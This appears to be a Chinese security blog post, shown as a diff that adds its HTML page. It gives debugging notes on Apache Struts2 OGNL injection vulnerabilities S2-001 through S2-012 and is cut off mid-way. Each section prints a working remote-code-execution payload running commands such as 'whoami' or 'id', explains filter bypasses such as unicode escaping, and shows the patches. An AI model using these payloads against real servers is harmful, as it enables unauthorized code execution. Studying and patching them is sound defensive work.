@@ -1,0 +1,405 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="google-site-verification" content="xBT4GhYoi5qRD5tr338pgPM5OWHHIDR6mNg1a3euekI" />
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta property="og:description" content="">
+    <meta property="og:type" content="website">
+    <meta name="description" content="">
+    <meta name="keyword"  content="">
+    <link rel="shortcut icon" href="/img/favicon.ico">
+
+    <title>
+        
+        Struts2漏洞调试笔记 - undefined
+        
+    </title>
+
+    <!-- Custom CSS -->
+    
+<link rel="stylesheet" href="/css/aircloud.css">
+
+    
+<link rel="stylesheet" href="/css/gitment.css">
+
+    <!--<link rel="stylesheet" href="https://imsun.github.io/gitment/style/default.css">-->
+    <link href="//at.alicdn.com/t/font_620856_28hi1hpxx24.css" rel="stylesheet" type="text/css">
+    <!-- ga & ba script hoook -->
+    <script></script>
+<meta name="generator" content="Hexo 6.2.0"></head>
+
+<body>
+
+<div class="site-nav-toggle" id="site-nav-toggle">
+    <button>
+        <span class="btn-bar"></span>
+        <span class="btn-bar"></span>
+        <span class="btn-bar"></span>
+    </button>
+</div>
+
+<div class="index-about">
+    <i>  </i>
+</div>
+
+<div class="index-container">
+    
+    <div class="index-left">
+        
+<div class="nav" id="nav">
+    <div class="avatar-name">
+        <div class="avatar ">
+            <img src="/img/avatar.jpeg" />
+        </div>
+        <div class="name">
+            <i>seaii</i>
+        </div>
+    </div>
+    <div class="contents" id="nav-content">
+        <ul>
+            <li >
+                <a href="/">
+                    <i class="iconfont icon-shouye1"></i>
+                    <span>HOME</span>
+                </a>
+            </li>
+            <li >
+                <a href="/tags">
+                    <i class="iconfont icon-biaoqian1"></i>
+                    <span>TAGS</span>
+                </a>
+            </li>
+            <li >
+                <a href="/archives">
+                    <i class="iconfont icon-guidang2"></i>
+                    <span>ARCHIVES</span>
+                </a>
+            </li>
+            <li >
+                <a href="/collect/">
+                    <i class="iconfont icon-shoucang1"></i>
+                    <span>COLLECT</span>
+                </a>
+            </li>
+            <li >
+                <a href="/about/">
+                    <i class="iconfont icon-guanyu2"></i>
+                    <span>ABOUT</span>
+                </a>
+            </li>
+            
+        </ul>
+    </div>
+    
+        <div id="toc" class="toc-article">
+    <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#0x01-%E5%89%8D%E8%A8%80"><span class="toc-text">0x01 前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x02-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90"><span class="toc-text">0x02 漏洞分析</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#s2-001"><span class="toc-text">s2-001</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#payload"><span class="toc-text">payload</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%98%B2%E5%BE%A1"><span class="toc-text">防御</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#s2-003"><span class="toc-text">s2-003</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#payload-1"><span class="toc-text">payload</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%98%B2%E5%BE%A1-1"><span class="toc-text">防御</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#s2-005"><span class="toc-text">s2-005</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#payload-2"><span class="toc-text">payload</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%98%B2%E5%BE%A1-2"><span class="toc-text">防御</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#s2-007"><span class="toc-text">s2-007</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#payload-3"><span class="toc-text">payload</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%98%B2%E5%BE%A1-3"><span class="toc-text">防御</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#s2-008"><span class="toc-text">s2-008</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#payload-4"><span class="toc-text">payload</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%98%B2%E5%BE%A1-4"><span class="toc-text">防御</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#s2-009"><span class="toc-text">s2-009</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#payload-5"><span class="toc-text">payload</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%98%B2%E5%BE%A1-5"><span class="toc-text">防御</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#s2-012"><span class="toc-text">s2-012</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#payload-6"><span class="toc-text">payload</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%98%B2%E5%BE%A1-6"><span class="toc-text">防御</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#s2-013-x2F-s2-014"><span class="toc-text">s2-013&#x2F;s2-014</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#payload-7"><span class="toc-text">payload</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%98%B2%E5%BE%A1-7"><span class="toc-text">防御</span></a></li></ol></li></ol></li></ol>
+</div>
+    
+</div>
+
+
+<div class="search-field" id="search-field">
+    <div class="search-bg" id="search-bg"></div>
+    <div class="search-container">
+        <div class="search-input">
+            <span id="esc-search"> <i class="icon-fanhui iconfont"></i></span>
+            <input id="search-input"/>
+            <span id="begin-search">search</span>
+        </div>
+        <div class="search-result-container" id="search-result-container">
+
+        </div>
+    </div>
+</div>
+
+        <div class="index-about-mobile">
+            <i>  </i>
+        </div>
+    </div>
+    
+    <div class="index-middle">
+        <!-- Main Content -->
+        
+
+
+<div class="post-container">
+    <div class="post-title">
+        Struts2漏洞调试笔记
+    </div>
+
+    <div class="post-meta">
+        <span class="attr">Post：<span>2019-12-29 11:45:00</span></span>
+        
+        </span>
+        <span class="attr">Visit：<span id="busuanzi_value_page_pv"></span>
+</span>
+</span>
+    </div>
+    <div class="post-content ">
+        <h2 id="0x01-前言"><a href="#0x01-前言" class="headerlink" title="0x01 前言"></a>0x01 前言</h2><p>为了能过下班后和周末不用学习、混吃等死的美好生活，开始了知识补漏行动，于是就有了这篇又臭又长的学习笔记。调试环境打包放在了github上，直接用idea打开就可以运行调试。</p>
+<p><a target="_blank" rel="noopener" href="https://github.com/proudwind/struts2_vulns/">https://github.com/proudwind/struts2_vulns&#x2F;</a></p>
+<span id="more"></span>
+
+
+<h2 id="0x02-漏洞分析"><a href="#0x02-漏洞分析" class="headerlink" title="0x02 漏洞分析"></a>0x02 漏洞分析</h2><h3 id="s2-001"><a href="#s2-001" class="headerlink" title="s2-001"></a>s2-001</h3><p>影响版本: 2.0.0 - 2.0.8</p>
+<h4 id="payload"><a href="#payload" class="headerlink" title="payload"></a>payload</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%&#123;#a=(<span class="keyword">new</span> <span class="title class_">java</span>.lang.ProcessBuilder(<span class="keyword">new</span> <span class="title class_">java</span>.lang.String[]&#123;<span class="string">&quot;whoami&quot;</span>&#125;)).redirectErrorStream(<span class="literal">true</span>).start(),#b=#a.getInputStream(),#c=<span class="keyword">new</span> <span class="title class_">java</span>.io.InputStreamReader(#b),#d=<span class="keyword">new</span> <span class="title class_">java</span>.io.BufferedReader(#c),#e=<span class="keyword">new</span> <span class="title class_">char</span>[<span class="number">50000</span>],#d.read(#e),#f=#context.get(<span class="string">&quot;com.opensymphony.xwork2.dispatcher.HttpServletResponse&quot;</span>),#f.getWriter().println(<span class="keyword">new</span> <span class="title class_">java</span>.lang.String(#e)),#f.getWriter().flush(),#f.getWriter().close()&#125;</span><br></pre></td></tr></table></figure>
+
+<p>分析第一个漏洞的时候啰嗦一些，把struts2的运行流程梳理一下。</p>
+<p>struts2是通过filter来拦截请求并处理，所以在<code>struts2-core-2.0.8.jar!/org/apache/struts2/dispatcher/FilterDispatcher.class</code>处，tomcat将请求交给struts2处理。</p>
+<p><img src="https://mdpicture.oss-cn-beijing.aliyuncs.com/20190822165124.png"></p>
+<p>经过漫长的调用（待详细研究），在<code>xwork-2.0.3.jar!/com/opensymphony/xwork2/interceptor/ParametersInterceptor.class</code>的<code>doIntercept</code>方法开始对传入的参数进行处理。</p>
+<p><img src="https://mdpicture.oss-cn-beijing.aliyuncs.com/20190822171441.png"></p>
+<p>最后反射调用，又经过漫长的调用之后，在<code>xwork-2.0.3.jar!/com/opensymphony/xwork2/DefaultActionInvocation.class</code>的<code>invokeAction</code>中调用了我们自定义的action。</p>
+<p><img src="https://mdpicture.oss-cn-beijing.aliyuncs.com/20190822172500.png"></p>
+<p>在我们自定义的逻辑运行完之后，struts2将返回响应，并重新渲染jsp。问题就出在重新渲染时，struts2对ognl表达式进行了二次解析，导致攻击者输入的恶意表达式被执行。</p>
+<p><img src="https://mdpicture.oss-cn-beijing.aliyuncs.com/20190822173356.png"></p>
+<p>继续跟进，这部分调用是将action的运行结果返回给tomcat，下一步开始重新渲染jsp页面，开始解析struts2自定义的标签。跟进到<code>struts2-core-2.0.8.jar!/org/apache/struts2/views/jsp/ComponentTagSupport.class</code></p>
+<p><img src="https://mdpicture.oss-cn-beijing.aliyuncs.com/20190822175214.png"></p>
+<p>继续跟进到：<code>struts2-core-2.0.8.jar!/org/apache/struts2/components/UIBean.class</code>的<code>evaluateParams</code>方法，对标签属性进行解析。</p>
+<p><img src="https://mdpicture.oss-cn-beijing.aliyuncs.com/20190822175607.png"></p>
+<p>如果开启了<code>altSyntax</code>，会将标签<code>name</code>属性的值（这里是username），用<code>%&#123;&#125;</code>包裹，进行进一步解析。</p>
+<p>继续跟进到<code>xwork-2.0.3.jar!/com/opensymphony/xwork2/util/TextParseUtil.class</code>的<code>translateVariables</code>方法：</p>
+<p><img src="https://mdpicture.oss-cn-beijing.aliyuncs.com/20190822180137.png"></p>
+<p>这里会将<code>%&#123;&#125;</code>中的值取出来，放入<code>findValue</code>方法中，继续跟进：</p>
+<p><code>xwork-2.0.3.jar!/com/opensymphony/xwork2/util/OgnlValueStack.class</code></p>
+<p><img src="https://mdpicture.oss-cn-beijing.aliyuncs.com/20190822180359.png"></p>
+<p>可以看到在这个方法中ognl表达式传入了<code>OgnlUtil.getValue</code>并执行。</p>
+<p>我们再回看<code>translateVariables</code>方法：</p>
+<p><img src="https://mdpicture.oss-cn-beijing.aliyuncs.com/20190822180638.png"></p>
+<p>这个方法对表达式是是递归解析的，如果说<code>%&#123;username&#125;</code>的结果还是一个表达式（被<code>%&#123;&#125;</code>包裹）的话，那么程序会继续解析，这造成了恶意ognl表达式的执行。</p>
+<h4 id="防御"><a href="#防御" class="headerlink" title="防御"></a>防御</h4><p>补丁中设置了一个最大循环解析次数，防止多次解析而造成漏洞。</p>
+<p><img src="https://mdpicture.oss-cn-beijing.aliyuncs.com/20190823102701.png"></p>
+<h3 id="s2-003"><a href="#s2-003" class="headerlink" title="s2-003"></a>s2-003</h3><p>影响版本: 2.0.0 - 2.0.11.2</p>
+<h4 id="payload-1"><a href="#payload-1" class="headerlink" title="payload"></a>payload</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">//s2-003，无回显，payload中特殊字符要urlencode，否则tomcat会报400</span><br><span class="line">(%27%5cu0023context[%5c%27xwork.MethodAccessor.denyMethodExecution%5c%27]%5cu003dfalse%27)(a)(a)&amp;(&#x27;%5cu0023rt%5cu003d@java.lang.Runtime@getRuntime().exec(%22open@-a@calculator.app%22.split(%22@%22))&#x27;)(a)(a)</span><br></pre></td></tr></table></figure>
+
+<p>在tomcat9和tomcat8.5.45中发送payload都会返回400（urlencode也不好使），参考vulhub使用了tomcat8.5.14。</p>
+<p>从payload来看，攻击分两步，首先开启ognl的方法调用，然后注入表达式执行代码。</p>
+<p>在<code>xwork-2.0.3.jar!/com/opensymphony/xwork2/interceptor/ParametersInterceptor.class</code>的<code>doIntercept</code>处开始进行参数绑定：</p>
+<p><img src="https://mdpicture.oss-cn-beijing.aliyuncs.com/20190823203152.png"></p>
+<p>安全起见，struts2禁止ognl表达式调用方法。跟进<code>setParameters</code>方法：</p>
+<p><img src="https://mdpicture.oss-cn-beijing.aliyuncs.com/20190823203815.png"></p>
+<p>获取请求参数的key，并通过<code>acceptableName</code>方法来验证是否合法，跟进看一下：</p>
+<p><img src="https://mdpicture.oss-cn-beijing.aliyuncs.com/20190823204210.png"></p>
+<p>对ognl中的一些关键字进行了过滤，可以通过unicode来绕过(<code># -&gt; \u0023</code>)，具体原因会在分析中说，这就导致ognl表达式仍然可以正常执行。</p>
+<p>验证完成之后，会对每一个传入的参数进行处理，并放入栈中。</p>
+<p><img src="https://mdpicture.oss-cn-beijing.aliyuncs.com/20190823205021.png"></p>
+<p>继续跟进，来到<code>xwork-2.0.4-sources.jar!/com/opensymphony/xwork2/util/OgnlValueStack.java</code>：</p>
+<p><img src="https://mdpicture.oss-cn-beijing.aliyuncs.com/20190823205215.png"></p>
+<p>继续<code>xwork-2.0.4-sources.jar!/com/opensymphony/xwork2/util/OgnlUtil.java</code></p>
+<p><img src="https://mdpicture.oss-cn-beijing.aliyuncs.com/20190823205518.png"></p>
+<p>这里首先在上下文的<code>expressions</code>列表中查找是否有我们传入的表达式，如果没有就进行解析，并将结果保存在上下文中，接下来是一个极为漫长的调用：</p>
+<p><img src="https://mdpicture.oss-cn-beijing.aliyuncs.com/20190823210331.png"></p>
+<p>到了<code>ognl-2.6.11-sources.jar!/ognl/JavaCharStream.java</code>的<code>readChar</code>方法：</p>
+<p><img src="https://mdpicture.oss-cn-beijing.aliyuncs.com/20190823210444.png"></p>
+<p>如果<code>\</code>后面有<code>u</code>，会进行转码处理，又进行了一通set操作之后，来到了<code>ognl-2.6.11-sources.jar!/ognl/ASTEval.java</code>的<code>setValueBody</code>方法：</p>
+<p><img src="https://mdpicture.oss-cn-beijing.aliyuncs.com/20190823210903.png"></p>
+<p><img src="https://mdpicture.oss-cn-beijing.aliyuncs.com/20190823211326.png"></p>
+<p>通过child的<code>getValue</code>方法，开始将传入的表达式一层层“剥开”，在一通get操作之后，来到了<code>getValueBody</code>方法：</p>
+<p><img src="https://mdpicture.oss-cn-beijing.aliyuncs.com/20190823211154.png"></p>
+<p><img src="https://mdpicture.oss-cn-beijing.aliyuncs.com/20190823211549.png"></p>
+<p>此时<code>node</code>已经是一个原始的ognl表达式了，继续跟进，经过一通调用之后：</p>
+<p><img src="https://mdpicture.oss-cn-beijing.aliyuncs.com/20190823212903.png"></p>
+<p>在<code>ognl-2.6.11-sources.jar!/ognl/OgnlRuntime.java</code>的<code>setProperty</code>方法中，开启了方法调用。</p>
+<p><img src="https://mdpicture.oss-cn-beijing.aliyuncs.com/20190823213243.png"></p>
+<p>至此我们完成了攻击的第一步，第二步代码执行过程比较相似，最后利用反射调用了表达式中的方法。</p>
+<p><code>ognl-2.6.11-sources.jar!/ognl/ASTMethod.java</code></p>
+<p><img src="https://mdpicture.oss-cn-beijing.aliyuncs.com/20190823214208.png"></p>
+<h4 id="防御-1"><a href="#防御-1" class="headerlink" title="防御"></a>防御</h4><p>事实证明官方对于s2-003的修复是失败的，但我们还是要看一下补丁，才能知道怎么绕过的：)。</p>
+<p>首先是更为严格的正则表达式：</p>
+<p><code>xwork-core-2.1.6-sources.jar!/com/opensymphony/xwork2/interceptor/ParametersInterceptor.java</code></p>
+<p><img src="https://mdpicture.oss-cn-beijing.aliyuncs.com/20190825150940.png"></p>
+<p><img src="https://mdpicture.oss-cn-beijing.aliyuncs.com/20190825150709.png"></p>
+<p><img src="https://mdpicture.oss-cn-beijing.aliyuncs.com/20190825150800.png"></p>
+<p>但是并没有解决unicode编码绕过的问题。</p>
+<p>同时设置了一个沙箱：</p>
+<p><img src="https://mdpicture.oss-cn-beijing.aliyuncs.com/20190825151138.png"></p>
+<p>在上面的分析过程中，只跟到<code>ognl-2.6.11-sources.jar!/ognl/ASTMethod.java</code>的<code>callStaticMethod</code>方法就听了，现在继续跟进：</p>
+<p><img src="https://mdpicture.oss-cn-beijing.aliyuncs.com/20190825151550.png"></p>
+<p><code>xwork-core-2.1.6.jar!/ognl/OgnlRuntime.class</code></p>
+<p><img src="https://mdpicture.oss-cn-beijing.aliyuncs.com/20190825151649.png"></p>
+<p>跟进这个函数看一下：</p>
+<p><code>xwork-core-2.1.6-sources.jar!/com/opensymphony/xwork2/ognl/SecurityMemberAccess.java</code></p>
+<p><img src="https://mdpicture.oss-cn-beijing.aliyuncs.com/20190825152323.png"></p>
+<p>这就是struts2的沙箱，如果调用的方法是静态方法，则检查<code>AllowStaticMethodAccess</code>，如果不允许，就只能调用白名单中的静态方法。</p>
+<h3 id="s2-005"><a href="#s2-005" class="headerlink" title="s2-005"></a>s2-005</h3><p>影响版本: 2.0.0 - 2.1.8.1</p>
+<p>如果继续用s2-003的payload，在调试过程中就会发现攻击的第一步，即：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">#context[&quot;xwork.MethodAccessor.denyMethodExecution&quot;]=false</span><br></pre></td></tr></table></figure>
+
+<p>是生效的：</p>
+<p><img src="https://mdpicture.oss-cn-beijing.aliyuncs.com/20190825152854.png"></p>
+<p>只是在第二步反射调用方法的时候受到了限制，限制的核心就是默认为false的<code>allowStaticMethodAccess</code>。那我们能不能用相同的方式将<code>allowStaticMethodAccess</code>设置为空呢？当然是可以的，payload如下：</p>
+<h4 id="payload-2"><a href="#payload-2" class="headerlink" title="payload"></a>payload</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(%27%5cu0023_memberAccess[%5c%27allowStaticMethodAccess%5c%27]%5cu003dtrue%27)(a)(a)&amp;(%27%5cu0023context[%5c%27xwork.MethodAccessor.denyMethodExecution%5c%27]%5cu003dfalse%27)(a)(a)&amp;((&#x27;%5cu0023rt.exec(%22open@-a@calculator.app%22.split(%22@%22))&#x27;)(%5cu0023rt%5cu003d@java.lang.Runtime@getRuntime()))(a)(a)</span><br></pre></td></tr></table></figure>
+
+<h4 id="防御-2"><a href="#防御-2" class="headerlink" title="防御"></a>防御</h4><p>补丁对参数的合法性进行了进一步的过滤：</p>
+<p><code>xwork-core-2.2.3-sources.jar!/com/opensymphony/xwork2/interceptor/ParametersInterceptor.java</code></p>
+<p><img src="https://mdpicture.oss-cn-beijing.aliyuncs.com/20190825180543.png"></p>
+<p>但是这样只是过滤了参数名，并没有过滤参数值，所以依然可以绕过，具体情况在s2-009中说。</p>
+<h3 id="s2-007"><a href="#s2-007" class="headerlink" title="s2-007"></a>s2-007</h3><p>影响版本: 2.0.0 - 2.2.3</p>
+<h4 id="payload-3"><a href="#payload-3" class="headerlink" title="payload"></a>payload</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#x27;+(paylaod)+&#x27;</span><br><span class="line"></span><br><span class="line">&#x27;+(#_memberAccess[&quot;allowStaticMethodAccess&quot;]=true,#foo=new java.lang.Boolean(&quot;false&quot;) ,#context[&quot;xwork.MethodAccessor.denyMethodExecution&quot;]=#foo,@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec(&#x27;id&#x27;).getInputStream()))+&#x27;</span><br></pre></td></tr></table></figure>
+
+<p>触发这个漏洞需要一些配置，首先要配置一个validator：</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span> ?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">validators</span> <span class="keyword">PUBLIC</span></span></span><br><span class="line"><span class="meta">        <span class="string">&quot;-//OpenSymphony Group//XWork Validator 1.0//EN&quot;</span></span></span><br><span class="line"><span class="meta">        <span class="string">&quot;http://www.opensymphony.com/xwork/xwork-validator-1.0.2.dtd&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">validators</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">field</span> <span class="attr">name</span>=<span class="string">&quot;age&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">field-validator</span> <span class="attr">type</span>=<span class="string">&quot;int&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">param</span> <span class="attr">name</span>=<span class="string">&quot;min&quot;</span>&gt;</span>1<span class="tag">&lt;/<span class="name">param</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">param</span> <span class="attr">name</span>=<span class="string">&quot;max&quot;</span>&gt;</span>150<span class="tag">&lt;/<span class="name">param</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">message</span>&gt;</span><span class="tag">&lt;/<span class="name">message</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">field-validator</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">field</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">validators</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>当我们传入的age参数无法通过验证时，页面会报错，同时触发漏洞。</p>
+<p>请求在到达Action进行逻辑处理之前，会经过一系列的拦截器(interceptor)，如果数据合法性验证不通过，会触发</p>
+<p><code>xwork-core-2.2.3-sources.jar!/com/opensymphony/xwork2/interceptor/ConversionErrorInterceptor.java</code>这个拦截器：</p>
+<p><img src="https://mdpicture.oss-cn-beijing.aliyuncs.com/20190825185925.png"></p>
+<p>将传入的参数逐一验证合法性，并将验证不通过的key、value放到<code>fakie</code>这个HashMap中。跟进<code>getOverrideExpr</code>看一下：</p>
+<p><code>struts2-core-2.2.3-sources.jar!/org/apache/struts2/interceptor/StrutsConversionErrorInterceptor.java</code></p>
+<p><img src="https://mdpicture.oss-cn-beijing.aliyuncs.com/20190825190424.png"></p>
+<p>反编译可能有点问题，其实就是：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">return</span> <span class="string">&quot;&#x27;&quot;</span> + value + <span class="string">&quot;&#x27;&quot;</span>;</span><br></pre></td></tr></table></figure>
+
+<p>没有对value做任何过滤，直接拼接。所以paylaod为<code>&#39;+(paylaod)+&#39;</code>，通过闭合单引号将ognl表达式注入进去。</p>
+<p>剩下的流程在s2-001中有过描述，最后会进入<code>xwork-2.0.3.jar!/com/opensymphony/xwork2/util/OgnlValueStack.class</code>的<code>translateVariables</code>方法，进行ognl表达式的解析和执行。</p>
+<h4 id="防御-3"><a href="#防御-3" class="headerlink" title="防御"></a>防御</h4><p><code>xwork-core-2.3.1-sources.jar!/com/opensymphony/xwork2/interceptor/ConversionErrorInterceptor.java</code></p>
+<p><img src="https://mdpicture.oss-cn-beijing.aliyuncs.com/20190825200103.png"></p>
+<p>防御非常简单，在拼接时对单引号进行了转义。</p>
+<h3 id="s2-008"><a href="#s2-008" class="headerlink" title="s2-008"></a>s2-008</h3><p>影响版本: 2.1.0 - 2.3.1</p>
+<h4 id="payload-4"><a href="#payload-4" class="headerlink" title="payload"></a>payload</h4><p>需开启debug模式。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">debug=command&amp;expression=(%23_memberAccess%5B%22allowStaticMethodAccess%22%5D%3Dtrue%2C%23foo%3Dnew%20java.lang.Boolean%28%22false%22%29%20%2C%23context%5B%22xwork.MethodAccessor.denyMethodExecution%22%5D%3D%23foo%2C@java.lang.Runtime@getRuntime%28%29.exec%28%22open%20%2fApplications%2fCalculator.app%22%29)</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>S2-008 涉及多个漏洞，Cookie 拦截器错误配置可造成 OGNL 表达式执行，但是由于大多 Web 容器（如 Tomcat）对 Cookie 名称都有字符限制，一些关键字符无法使用使得这个点显得比较鸡肋。另一个比较鸡肋的点就是在 struts2 应用开启 devMode 模式后会有多个调试接口能够直接查看对象信息或直接执行命令，正如 kxlzx 所提这种情况在生产环境中几乎不可能存在，因此就变得很鸡肋的，但我认为也不是绝对的，万一被黑了专门丢了一个开启了 debug 模式的应用到服务器上作为后门也是有可能的。</p>
+</blockquote>
+<h4 id="防御-4"><a href="#防御-4" class="headerlink" title="防御"></a>防御</h4><p>在<code>struts2-core-2.3.12.jar!/org/apache/struts2/interceptor/CookieInterceptor.class</code>和</p>
+<p><code>xwork-core-2.3.12.jar!/com/opensymphony/xwork2/interceptor/ParametersInterceptor.class</code>中对加强了对参数的过滤。</p>
+<p><img src="https://mdpicture.oss-cn-beijing.aliyuncs.com/20190826151402.png"></p>
+<h3 id="s2-009"><a href="#s2-009" class="headerlink" title="s2-009"></a>s2-009</h3><p>影响版本: 2.1.0 - 2.3.1</p>
+<h4 id="payload-5"><a href="#payload-5" class="headerlink" title="payload"></a>payload</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username=(%23context[&quot;xwork.MethodAccessor.denyMethodExecution&quot;]%3d+new+java.lang.Boolean(false),%23_memberAccess[&quot;allowStaticMethodAccess&quot;]%3d+new+java.lang.Boolean(true),%40java.lang.Runtime%40getRuntime().exec(&#x27;open%40-a%40Calculator.app&#x27;.split(&quot;%40&quot;)))&amp;z[(username)(1)]</span><br></pre></td></tr></table></figure>
+
+<p>在s2-005的防御中我们提到了补丁仍然可以绕过，这是因为struts2只验证了参数的key的合法性，并没验证value。</p>
+<p><img src="https://mdpicture.oss-cn-beijing.aliyuncs.com/20190826111020.png"></p>
+<p>这样就可以通过设置参数的value来将ognl表达式注入到上下文中。</p>
+<p>首先我们将一个实际存在的参数的value设置为恶意的ognl表达式，以上面payload中的username参数为例。</p>
+<p>接着我们传入第二个参数<code>z[(username)(1)]</code>，struts2在解析这个表达式的时候会尝试调用Action中的getter来获取username的值（调用栈太长就不贴了）。</p>
+<p><code>ognl-3.0.3-sources.jar!/ognl/OgnlRuntime.java</code></p>
+<p><img src="https://mdpicture.oss-cn-beijing.aliyuncs.com/20190826114023.png"></p>
+<h4 id="防御-5"><a href="#防御-5" class="headerlink" title="防御"></a>防御</h4><p><code>xwork-core-2.3.12.jar!/com/opensymphony/xwork2/interceptor/ParametersInterceptor.class</code></p>
+<p><img src="https://mdpicture.oss-cn-beijing.aliyuncs.com/20190826150842.png"></p>
+<p>再次修改了正则表达式，防止<code>(ognl)(1)</code>这种形式的攻击。</p>
+<h3 id="s2-012"><a href="#s2-012" class="headerlink" title="s2-012"></a>s2-012</h3><p>影响版本: 2.1.0 - 2.3.13</p>
+<h4 id="payload-6"><a href="#payload-6" class="headerlink" title="payload"></a>payload</h4><p>直接使用s2-001的payload即可。</p>
+<p>需要配置一个重定向：</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">action</span> <span class="attr">name</span>=<span class="string">&quot;login&quot;</span> <span class="attr">class</span>=<span class="string">&quot;cn.seaii.s2001.action.LoginAction&quot;</span>&gt;</span></span><br><span class="line">		<span class="comment">&lt;!--s2-012--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">result</span> <span class="attr">name</span>=<span class="string">&quot;redirect&quot;</span> <span class="attr">type</span>=<span class="string">&quot;redirect&quot;</span>&gt;</span>/login.jsp?username=$&#123;username&#125;<span class="tag">&lt;/<span class="name">result</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">result</span> <span class="attr">name</span>=<span class="string">&quot;success&quot;</span>&gt;</span>login.jsp<span class="tag">&lt;/<span class="name">result</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">result</span> <span class="attr">name</span>=<span class="string">&quot;error&quot;</span>&gt;</span>login.jsp<span class="tag">&lt;/<span class="name">result</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">action</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>Action：</p>
